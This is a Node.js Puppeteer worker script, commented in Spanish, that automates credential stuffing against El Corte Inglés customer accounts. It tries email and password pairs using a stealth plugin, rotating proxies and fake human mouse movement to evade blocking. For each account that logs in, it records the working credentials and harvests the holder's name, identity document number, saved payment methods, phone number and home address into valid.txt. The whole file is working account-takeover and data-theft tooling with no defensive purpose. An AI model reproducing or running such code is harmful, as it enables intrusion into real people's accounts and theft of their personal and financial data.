const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { parentPort, workerData } = require('worker_threads');
const path = require('path');
const fs = require('fs-extra');
const os = require('os');
const { execSync } = require('child_process');

puppeteer.use(StealthPlugin());

let isPaused = false;
let browser;

// Función para manejar la pausa
function checkPaused() {
    return new Promise((resolve) => {
        const interval = setInterval(() => {
            if (!isPaused) {
                clearInterval(interval);
                resolve();
            }
        }, 100); // Verifica cada 100ms si el worker sigue en pausa
    });
}

// Manejar mensajes desde el proceso principal
parentPort.on('message', async (message) => {
    if (message === 'pause') {
        isPaused = true;
        parentPort.postMessage('Worker pausado');
    } else if (message === 'resume') {
        isPaused = false;
        parentPort.postMessage('Worker reanudado');
    } else if (message === 'stop') {
        parentPort.postMessage('Worker detenido');
        if (browser) {
            try {
                await browser.close(); // Cierra el navegador
                parentPort.postMessage('Navegador cerrado.');
            } catch (error) {
                console.error('Error al cerrar el navegador:', error);
            }
        }
        process.exit(0); // Finalizar el proceso del worker
    }
});

async function runWorker(credentials, proxies, useProxies, retryOnFail, humanizedMode) {
    console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
    let proxyIndex = 0;
    const results = [];

    for (let i = 0; i < credentials.length; i++) {
        await checkPaused();

        const { email, password } = credentials[i];
        parentPort.postMessage(`Verificando: ${email}`);

        // Crear un nuevo contexto de navegador para aislar la sesión
        let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
        let { browser, page, userDataDir } = await createBrowserInstance(proxy);

        try {
            await reuseSession(page, `session_${email}.json`); // Reutilizar sesión si existe

            if(humanizedMode){
                await page.goto('https://cuenta.elcorteingles.es/servicios/citas/', {
                    waitUntil: ['load', 'networkidle2'], 
                    timeout: 60000 
                });
                
            }else{
                await page.goto('https://cuenta.elcorteingles.es/servicios/citas/', {
                    waitUntil: ['load', 'networkidle2'], 
                    timeout: 60000 
                });
              
            }
           
            await checkPaused();

            await checkAccessDenied(page);

            await rejectCookies(page);


            if (humanizedMode){
               // await simulateEmailAddressClick(page);
            }else{

            }
           

            //await page.waitForSelector('#verify-account-email');
            
            if (humanizedMode) {
            //    await simulateUserActivity(page);  // Simula la actividad del usuario antes de escribir el email
            }

            const loginSuccessful = await login(page, email, password, humanizedMode);

            await checkAccessDenied(page);

            if (loginSuccessful) {
                fs.appendFileSync('valid.txt', `\n---------------------------\n${email}:${password}\n---------------------------\n`);
                // Llamada al método de extracción de datos personales
                const userData = await extractUserData(page);
                console.log('la variable de userdata es :', userData);
                // Llamada al método de guardado de datos en el archivo
                saveValidData(userData);
                await checkAccessDenied(page);

                // Llamar al método de extracción de métodos de pago
                const paymentMethods = await extractPaymentMethods(page);
                await checkAccessDenied(page);
                // Llamar al método de guardado de métodos de pago en el archivo
                savePaymentMethods(email, paymentMethods);

                // Llamar al método de extracción de número de teléfono
                const phoneNumberData = await extractPhoneNumber(page);
                // Llamar al método de guardado de número de teléfono en el archivo
                saveNumberData(phoneNumberData);
                await checkAccessDenied(page);
            }

        } catch (error) {

            i = await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
        } finally {
            try {
                if (page && !page.isClosed()) {
                    await page.close(); 
                }
                if (browser && browser.isConnected()) {
                    await browser.close(); 
                }
            } catch (closeError) {
                parentPort.postMessage(`Error al cerrar la página o el navegador: ${closeError.message}`);
            }
            try {
                if (fs.existsSync(userDataDir)) {
                    fs.removeSync(userDataDir);
                }
            } catch (removeError) {
                parentPort.postMessage(`Error al eliminar el directorio ${userDataDir}: ${removeError.message}`);
            }
        }
    }

    await browser.close();  // Cierra el navegador al finalizar todo
    fs.writeFileSync(`resultados-worker-${process.pid}.json`, JSON.stringify(results, null, 2));
    await checkPaused();
    parentPort.postMessage('Worker ha finalizado todas las tareas.');
}

async function getUserAgent() {
    try {
        const userAgent = execSync('python3 get_user_agent.py').toString().trim();
        return userAgent;
    } catch (error) {
        console.error('Error al obtener el User-Agent:', error.message);
        throw error;
    }
}

async function createBrowserInstance(proxy) {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-blink-features=AutomationControlled',
        '--disable-extensions',
        '--disable-dev-shm-usage',
        '--disable-infobars',
        '--window-size=1280,800',
        '--disable-accelerated-2d-canvas', 
    ];

    let proxyAuth;
    let proxyUrl;

    if (proxy) {
        if (proxy.includes('@')) {
            // Formato host:port@username:password
            const [hostPort, userPass] = proxy.split('@');
            const [host, port] = hostPort.split(':');
            const [username, password] = userPass.split(':');

            proxyUrl = `http://${host}:${port}`;
            proxyAuth = { username, password };
        } else if (proxy.split(':').length === 4) {
            // Formato host:port:username:password
            const [host, port, username, password] = proxy.split(':');

            proxyUrl = `http://${host}:${port}`;
            proxyAuth = { username, password };
        } else {
            parentPort.postMessage("Formato de proxy inválido. Se espera: host:port o host:port:username:password o host:port@username:password");
            return;
        }

        args.push(`--proxy-server=${proxyUrl}`);
    }

    try {
        const userDataDir = path.join(os.tmpdir(), `puppeteer_profile_${Date.now()}`);
        fs.ensureDirSync(userDataDir);

        const userAgent = await getUserAgent();
        const browser = await puppeteer.launch({
            headless: workerData.useHeadless,
            args: args,
            userDataDir,
        });

        const page = await browser.newPage();
        await page.setUserAgent(userAgent);

        if (proxyAuth) {
            await page.authenticate(proxyAuth);
        }

        return { browser, page, userDataDir };

    } catch (error) {
        console.error("Error al crear la instancia del navegador:", error.message);
        throw error;
    }
}



async function login(page, email, password, humanizedMode) {
    // Rellenar los campos de login y password
    await page.type('#login', email, { delay: humanizedMode ? randomDelay(100, 300) : 0 });
    await page.type('#password', password, { delay: humanizedMode ? randomDelay(100, 200) : randomDelay(0, 0) });
    await checkPaused();   
    // Hacer clic en el botón de login
    await page.click('#login-btn');

    // Verificar si aparece un mensaje de error
    const errorMessageSelector = '.eci_message-text';
    const expectedText = 'Usuario o contraseña incorrectos';
    await checkPaused();
    try {
        // Esperar a que el elemento con el mensaje de error aparezca en la página
        await page.waitForSelector(errorMessageSelector, { timeout: 5000 });

        // Obtener el texto del elemento
        const actualText = await page.evaluate((selector) => {
            return document.querySelector(selector)?.innerText;
        }, errorMessageSelector);
        await checkPaused();
        // Verificar si el texto coincide con el mensaje de error esperado
        if (actualText && actualText.includes(expectedText)) {
            parentPort.postMessage('Datos incorrectos');
            return false; // Retornar false para indicar que el login falló
        }
    } catch (error) {
        console.error('El mensaje de error no apareció, o sucedió otra cosa.');
    }

    // Verificar la URL para comprobar si se redirige a la página de cambio de contraseña
    const currentUrl = await page.url();
    if (currentUrl.includes('/cambiar-contrasena/')) {
        parentPort.postMessage('Error: El usuario pide cambiar la contraseña.');
        return false; // Retornar false para indicar que se necesita cambiar la contraseña
    }

    // Verificar si la URL indica que el login fue exitoso
    if (currentUrl.includes('/servicios/citas/')) {
        parentPort.postMessage('Usuario logueado correctamente');
        return true; // Retornar true si la URL indica que el login fue exitoso
    } else {
        console.log('Error al loguear al usuario, URL inesperada:', currentUrl);
        return false; // Retornar false si la URL no es la esperada
    }
}








async function checkAccessDenied(page) {
    const accessDenied = await page.evaluate(() => {
        const h1Element = document.querySelector('h1');
        return h1Element && h1Element.textContent.includes('Access Denied');
    });

    if (accessDenied) {
        // Puedes cambiar el mensaje o la acción según lo necesites
        parentPort.postMessage('Elemento "Access Denied" detectado: IP bloqueada.');
        throw new Error('IP bloqueada');
    }
}

async function rejectCookies(page) {
    const rejectButtonSelector = '#onetrust-reject-all-handler';
    
    try {
        
        await page.waitForSelector(rejectButtonSelector, { timeout: 5000 });
        
        
        await page.click(rejectButtonSelector);
        
        parentPort.postMessage('Cookies rechazadas.');
    } catch (error) {
        parentPort.postMessage('Botón de rechazo de cookies no encontrado o no se mostró.');
    }
}



function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function extractUserData(page) {
    
    await page.goto('https://cuenta.elcorteingles.es/es/perfil/datos-personales/', {
        waitUntil: ['load', 'networkidle2'], 
        timeout: 60000 
    });
    

    await page.waitForSelector('#given_name');
    await page.waitForSelector('#first_family_name');
    await page.waitForSelector('#second_family_name');
    await page.waitForSelector('#alias');
    await page.waitForSelector('input[name="id_document"]');

    const userData = await page.evaluate(() => {
        const getInputValue = (selector) => document.querySelector(selector)?.value || '';
        
        return {
            nombre: getInputValue('#given_name'),
            apellido1: getInputValue('#first_family_name'),
            apellido2: getInputValue('#second_family_name'),
            alias: getInputValue('#alias'),
            documento: getInputValue('input[name="id_document"]')
        };
    });

    parentPort.postMessage(`Datos personales extraídos: ${JSON.stringify(userData)}`);
    return userData;
}

async function extractPaymentMethods(page) {
    // Navegar a la URL de medios de pago
    await page.goto('https://cuenta.elcorteingles.es/es/medios-de-pago/', { waitUntil: 'networkidle2' });

    // Esperar a que los elementos de medios de pago estén presentes
    await page.waitForSelector('[data-test-id="payment-method-item"]');

    // Extraer los datos de los métodos de pago
    const paymentMethods = await page.evaluate(() => {
        const methods = [];
        const items = document.querySelectorAll('[data-test-id="payment-method-item"]');
        
        items.forEach(item => {
            const alias = item.querySelector('[data-test-id="payment-method-item-alias-wrapper"] span')?.innerText || 'Sin Alias';
            const description = item.querySelector('[data-test-id="payment-method-item-description-wrapper"]')?.innerText || 'Sin Descripción';
            const maskedNumber = item.querySelector('[data-test-id="payment-method-item-mask-wrapper"]')?.innerText || 'Sin Número';
            const isDefault = item.querySelector('.eci-tag._primary') !== null; // Comprueba si es el método por defecto

            methods.push({
                alias,
                description,
                maskedNumber,
                isDefault
            });
        });

        return methods;
    });

    parentPort.postMessage(`Métodos de Pago Extraídos: ${JSON.stringify(paymentMethods)}`);
    return paymentMethods;
}

async function extractPhoneNumber(page,startX, startY, endX, endY) {
    // Paso 1: Navegar a la página del producto y añadirlo a la cesta
    
    await page.goto('https://www.elcorteingles.es/moda-mujer/MP_0478263_35T2GM9S3L-bolso-de-hombro-mercer-de-piel-convertible-a-bandolera/', {
        waitUntil: ['load', 'networkidle2'], 
        timeout: 60000 
    });

    

    await page.click('.product_detail-add_to_cart.pointer');

    // Paso 2: Navegar a la cesta

    await simulateUserActivity(page);

    await page.goto('https://www.elcorteingles.es/compra/tramitacion/cesta', { waitUntil: 'networkidle2' });

    await checkPaused();
    
    // Paso 3: Navegar a la página de pago
    await navigateToPaymentPage(page)

    // Paso 4: Extraer los datos de la dirección y el número de teléfono
    const userData = await page.evaluate(() => {
        const getElementValue = (selector) => document.querySelector(selector)?.value || null;

        return {
            nombre: getElementValue('input#first_name'),
            primerApellido: getElementValue('input#last_name'),
            segundoApellido: getElementValue('input#second_last_name'),
            calle: getElementValue('input#street_name'),
            numero: getElementValue('input#house_number'),
            piso: getElementValue('input#level'),
            puerta: getElementValue('input#door'),
            codigoPostal: getElementValue('input#postal_code'),
            ciudad: getElementValue('input#city'),
            telefono: getElementValue('input#phone_number'),
            pais: document.querySelector('select#country_eci_code option[selected]')?.innerText || null,
            provincia: document.querySelector('select#province_code option[selected]')?.innerText || null
        };
    });
    await checkPaused();
    parentPort.postMessage(`Datos extraídos: ${JSON.stringify(userData)}`);
    return userData;
}

async function navigateToPaymentPage(page) {
    let maxRetries = 3;
    let currentRetry = 0;
    let isOnPaymentPage = false;

    while (currentRetry < maxRetries && !isOnPaymentPage) {
        // Navegar a la página de pago
        await page.waitForSelector('#js-payment-button');
        await page.click('#js-payment-button');
        await new Promise(resolve => setTimeout(resolve, randomDelay(3000, 5000)));
        await page.goto('https://www.elcorteingles.es/compra/tramitacion/pago', {
            waitUntil: ['load', 'networkidle2'], 
            timeout: 60000 
        });

        // Pausar para permitir que la página se cargue completamente
        await checkPaused();

        // Verificar la URL actual
        const currentUrl = page.url();

        if (currentUrl === 'https://www.elcorteingles.es/compra/tramitacion/pago') {
            parentPort.postMessage('Navegación exitosa a la página de pago.');
            isOnPaymentPage = true;
        } else if (currentUrl === 'https://www.elcorteingles.es/compra/tramitacion/cesta?expired=true') {
            parentPort.postMessage('Sesión expirada, reintentando navegación...');
            currentRetry++;
            
        } else {
            console.log('Se ha navegado a una URL inesperada:', currentUrl);
            currentRetry++;
        }
    }

    if (!isOnPaymentPage) {
        throw new Error('No se pudo navegar a la página de pago después de varios intentos.');
    }
}



function saveNumberData(userData) {
    if (!userData || !userData.telefono) {
        parentPort.postMessage('No hay datos válidos para guardar.');
        return;
    }

    const data = 
        `Nombre: ${userData.nombre} ${userData.primerApellido} ${userData.segundoApellido || ''}\n` +
        `Dirección: ${userData.calle} ${userData.numero}, Piso: ${userData.piso}, Puerta: ${userData.puerta}\n` +
        `Código Postal: ${userData.codigoPostal}\n` +
        `Ciudad: ${userData.ciudad}\n` +
        `Provincia: ${userData.provincia}\n` +
        `País: ${userData.pais}\n` +
        `Teléfono: ${userData.telefono}\n` +
        `-----------------------------------------\n`;

    fs.appendFileSync('valid.txt', data, 'utf8');
    parentPort.postMessage('Datos guardados en valid.txt');
}



function saveValidData(userData) {
    // Verificación de que todos los datos existen
    const nombre = userData.nombre || 'Nombre no definido';
    const apellido1 = userData.apellido1 || 'Primer apellido no definido';
    const apellido2 = userData.apellido2 || 'Segundo apellido no definido';
    const alias = userData.alias || 'Alias no definido';
    const documento = userData.documento || 'Documento no definido';

    const data =
        `Nombre: ${nombre}\nPrimer Apellido: ${apellido1}\n` +
        `Segundo Apellido: ${apellido2}\nAlias: ${alias}\n` +
        `Número de Documento: ${documento}\n` +
        `-----------------------------------------\n`;
    
    fs.appendFileSync('valid.txt', data, 'utf8');
    parentPort.postMessage('Datos guardados en valid.txt');
}
function savePaymentMethods(email, paymentMethods) {
    let data = `Email: ${email}\nMétodos de Pago:\n`;

    paymentMethods.forEach((method, index) => {
        data += `Método ${index + 1}:\n` +
                `Alias: ${method.alias}\n` +
                `Descripción: ${method.description}\n` +
                `Número: ${method.maskedNumber}\n` +
                `Por Defecto: ${method.isDefault ? 'Sí' : 'No'}\n` +
                `-----------------------------------------\n`;
    });

    fs.appendFileSync('valid.txt', data, 'utf8');
    parentPort.postMessage('Métodos de pago guardados en valid.txt');
}


async function handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser }) {
    if (error.message.includes('IP bloqueada') || error.message.includes('Access Denied')) {
        parentPort.postMessage('Manejando bloqueo y reintentando...');
        if (retryOnFail) {
            if (useProxies) {
                proxyIndex = (proxyIndex + 1) % proxies.length;
                parentPort.postMessage(`Cambiando a proxy ${proxyIndex} y reintentando...`);
            }
            i--; // Reintentar con el mismo correo
        }
    } else if (error.message.includes('net::ERR_NO_SUPPORTED_PROXIES')) {
        parentPort.postMessage(`Proxy no soportado. Cambiando a otro proxy...`);
        await browser.close();
        proxyIndex = (proxyIndex + 1) % proxies.length;
        if (retryOnFail) {
            i--; // Reintentar con un proxy diferente
        }
    } else if (error.message.includes('net::ERR_TUNNEL_CONNECTION_FAILED')) {
        parentPort.postMessage('Error de conexión de túnel. Reintentando con un proxy diferente...');
        await browser.close();
        if (useProxies && proxies.length > 0) {
            proxyIndex = (proxyIndex + 1) % proxies.length;
            if (retryOnFail) {
                i--; // Reintentar con un proxy diferente
            }
        } else {
            parentPort.postMessage('No hay más proxies disponibles. Abortando...');
        }
    } else if (error.name === 'TimeoutError') {
        parentPort.postMessage('TimeoutError detectado. Asumiendo IP bloqueada.');
        await browser.close();
        if (useProxies && proxies.length > 0) {
            proxyIndex = (proxyIndex + 1) % proxies.length;
            if (retryOnFail) {
                i--; // Reintentar con un proxy diferente
            }
        } else if (!useProxies && retryOnFail) {
            i--; // Reintentar sin proxy
        }
    } else if (error.message.includes('URL inesperada') || error.message.includes('oauth/authorize')) {
        parentPort.postMessage('Error de inicio de sesión detectado: URL inesperada de autorización. Reintentando...');
        await browser.close();
        if (retryOnFail) {
            if (useProxies) {
                proxyIndex = (proxyIndex + 1) % proxies.length;
                parentPort.postMessage(`Cambiando a proxy ${proxyIndex} y reintentando...`);
            }
            i--; // Reintentar con el mismo correo
        }
    } else {
        parentPort.postMessage(`Error inesperado: ${error.message}`);
    }

    return i;
}



async function reuseSession(page, cookiesFilePath) {
    if (fs.existsSync(cookiesFilePath)) {
        const cookies = JSON.parse(fs.readFileSync(cookiesFilePath));
        await page.setCookie(...cookies);
    }
}

async function saveSession(page, cookiesFilePath) {
    const cookies = await page.cookies();
    fs.writeFileSync(cookiesFilePath, JSON.stringify(cookies, null, 2));
}


function extractCardData(formHTML) {
    const extractInputValue = (html, id) => {
        const regex = new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]+)"`, 'i');
        const match = regex.exec(html);
        return match ? match[1] : 'No disponible';
    };

    const extractInputByName = (html, name) => {
        const regex = new RegExp(`<input[^>]*name="${name}"[^>]*value="([^"]+)"`, 'i');
        const match = regex.exec(html);
        return match ? match[1] : 'No disponible';
    };

    const cardNumber = extractInputValue(formHTML, 'cardNumber');
    const expirationDate = extractInputValue(formHTML, 'expirationDate');
    const fullName = extractInputByName(formHTML, 'fullName');
    const address = extractInputByName(formHTML, 'addressLine1');
    const city = extractInputByName(formHTML, 'city');
    const zipCode = extractInputByName(formHTML, 'zipCode');
    const phoneNumber = extractInputByName(formHTML, 'dayPhone');

    const stateMatch = formHTML.match(/<button[^>]*>(.*?)<\/button>/);
    const state = stateMatch ? stateMatch[1] : 'No disponible';

    return { cardNumber, expirationDate, fullName, address, city, state, zipCode, phoneNumber };
}


async function closeCardForm(page, humanizedMode) {
    try {
        parentPort.postMessage('Intentando cerrar el formulario...');
        await page.evaluate(() => {
            document.querySelector('button[aria-label="close modal"]').click();
        });
        await checkPaused();
        await new Promise(resolve => setTimeout(resolve, humanizedMode ? 2000 : 2000));
        parentPort.postMessage('Formulario cerrado exitosamente.');
    } catch (error) {
        parentPort.postMessage('Error al intentar cerrar el formulario: ' + error.message);
    }
}


async function simulateEmailAddressClick(page) {
    const selector = '#verify-account-email';

    const button = await page.$(selector);
    const buttonBox = await button.boundingBox();

    const randomX = buttonBox.x + Math.random() * buttonBox.width;
    const randomY = buttonBox.y + Math.random() * buttonBox.height;

    // Mover el ratón cerca del botón con pequeñas pausas
    await page.mouse.move(randomX, randomY, { steps: randomDelay(5, 15) });
    await randomDelay(100, 200);
    await page.mouse.move(randomX + randomJitter(), randomY + randomJitter(), { steps: randomDelay(5, 10) });

    // Mover al centro y hacer clic
    const centerX = buttonBox.x + buttonBox.width / 2;
    const centerY = buttonBox.y + buttonBox.height / 2;
    await page.mouse.move(centerX, centerY, { steps: randomDelay(10, 20) });
    await randomDelay(100, 200);  // Pausa antes del clic
    await page.mouse.click(centerX, centerY);
    await randomDelay(100, 200);  // Pausa después del clic

    // Mover el ratón hacia un lado de la pantalla
    const screenWidth = 1280; 
    const screenHeight = 800;
    const moveToX = randomX > screenWidth / 2 ? 0 : screenWidth;
    const moveToY = randomY > screenHeight / 2 ? screenHeight : 0;

    await page.mouse.move(moveToX, moveToY, { steps: randomDelay(15, 30) });
}

async function simulateHumanClick(page, selector) {
    const button = await page.$(selector);
    const buttonBox = await button.boundingBox();

    // Mover el ratón hacia el botón con un movimiento centralizado
    await page.mouse.move(
        buttonBox.x + buttonBox.width / 2,
        buttonBox.y + buttonBox.height / 2,
        { steps: randomDelay(10, 20) }
    );

    await randomDelay(100, 200);

    // Ajuste de precisión antes del clic
    await page.mouse.move(
        buttonBox.x + buttonBox.width / 2 + randomJitter(),
        buttonBox.y + buttonBox.height / 2 + randomJitter(),
        { steps: randomDelay(5, 10) }
    );

    await randomDelay(100, 200);
    await page.click(selector);
}


async function simulateUserActivity(page) {
    const startX = randomPosition();
    const startY = randomPosition();
    const endX = randomPosition();
    const endY = randomPosition();
    
    // Mover el ratón en una curva simulada
    await moveMouseInCurve(page, startX, startY, endX, endY);

    // Pequeños ajustes en la posición del ratón
    await randomDelay(50, 100);
    await page.mouse.move(endX + randomJitter(), endY + randomJitter());

    // Clic en la nueva posición ajustada
    await randomDelay(50, 150);
    await page.mouse.click(endX, endY);
}

async function moveMouseInCurve(page, startX, startY, endX, endY) {
    const steps = 10 + Math.floor(Math.random() * 5);
    for (let i = 0; i <= steps; i++) {
        const t = i / steps;
        const curveX = startX + (endX - startX) * easeInOutQuad(t);
        const curveY = startY + (endY - startY) * easeInOutQuad(t);
        await page.mouse.move(curveX, curveY);
        await randomDelay(20, 50);
    }
}

function easeInOutQuad(t) {
    return t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t;
}


function randomJitter() {
    return Math.random() * 4 - 2; // Pequeño ajuste entre -2 y +2 píxeles
}

function randomPosition() {
    return Math.floor(Math.random() * 800) + 100;
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retryOnFail, workerData.humanizedMode).catch(console.error);
